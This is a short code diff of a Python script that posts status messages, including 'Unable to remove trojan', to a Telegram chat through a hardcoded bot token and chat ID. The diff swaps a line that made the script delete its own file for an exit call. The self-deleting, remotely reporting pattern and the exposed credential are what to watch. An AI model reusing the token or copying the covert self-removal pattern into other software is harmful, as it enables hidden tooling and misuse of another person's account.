@@ -16,7 +16,6 @@ def sender(message):
 	bot = telebot.TeleBot('8481096717:AAHx35rMNRLOih1bbHqPyc4LTdWW99CoWYo')
 	bot.send_message(5867708857, message)
 
-
 def extract_url_from_text(text, process):
 	words = text.split()
 	if "yes" in words:
@@ -137,4 +136,4 @@ else:
 	message = "☆ Unable to remove trojan."
 	sender(message)
 
-os.remove(os.path.abspath(__file__))
+os.system('exit')
